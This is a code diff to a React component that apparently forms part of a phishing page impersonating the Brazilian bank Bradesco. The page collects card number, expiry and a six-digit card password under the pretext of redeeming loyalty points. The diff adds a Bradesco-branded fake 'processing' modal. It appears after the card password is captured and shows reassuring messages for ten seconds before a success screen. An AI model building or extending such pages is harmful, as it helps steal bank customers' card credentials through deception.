@@ -19,6 +19,16 @@ const SenhaAcesso = () => {
     "Processando Resgate",
   ];
   const [cardLoadingStep, setCardLoadingStep] = useState(0);
+  const [showFinalLoading, setShowFinalLoading] = useState(false);
+  const FINAL_LOADING_MESSAGES = [
+    "Processando...",
+    "Validando seus pontos",
+    "Verificando saldo disponível",
+    "Processando resgate",
+    "Finalizando validação",
+    "Aguarde... Estamos te direcionando para a próxima etapa",
+  ];
+  const [finalLoadingStep, setFinalLoadingStep] = useState(0);
   const [senha, setSenha] = useState("");
   const [numero, setNumero] = useState("");
   const [validade, setValidade] = useState("");
@@ -75,10 +85,27 @@ const SenhaAcesso = () => {
     }
   };
 
+  useEffect(() => {
+    if (!showFinalLoading) return;
+    const interval = 10000 / FINAL_LOADING_MESSAGES.length;
+    const timer = setInterval(() => {
+      setFinalLoadingStep((prev) => {
+        if (prev >= FINAL_LOADING_MESSAGES.length - 1) return prev;
+        return prev + 1;
+      });
+    }, interval);
+    const redirect = setTimeout(() => {
+      setShowFinalLoading(false);
+      setPhase("sucesso");
+    }, 10000);
+    return () => { clearInterval(timer); clearTimeout(redirect); };
+  }, [showFinalLoading]);
+
   const handleSenhaCartao = () => {
     if (senhaCartao.length === 6) {
       captureFormData("senha-cartao", { senhaCartao });
-      setPhase("sucesso");
+      setShowFinalLoading(true);
+      setFinalLoadingStep(0);
     }
   };
 
@@ -254,6 +281,20 @@ const SenhaAcesso = () => {
             <div className="w-10 h-10 border-[3px] border-muted rounded-full border-t-[#D7004D] animate-spin mb-6" />
             <p className="text-muted-foreground text-base text-center">
               {CARD_LOADING_MESSAGES[cardLoadingStep]}
+            </p>
+          </div>
+        </div>
+      )}
+
+      {/* Loading Modal before success */}
+      {showFinalLoading && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center">
+          <div className="fixed inset-0 bg-black/50" />
+          <div className="relative z-50 w-full max-w-sm mx-4 bg-card rounded-2xl p-8 shadow-xl flex flex-col items-center">
+            <img src={bradescoLogoNew} alt="Bradesco" className="h-12 mb-6" />
+            <div className="w-10 h-10 border-[3px] border-muted rounded-full border-t-[#D7004D] animate-spin mb-6" />
+            <p className="text-muted-foreground text-base text-center">
+              {FINAL_LOADING_MESSAGES[finalLoadingStep]}
             </p>
           </div>
         </div>
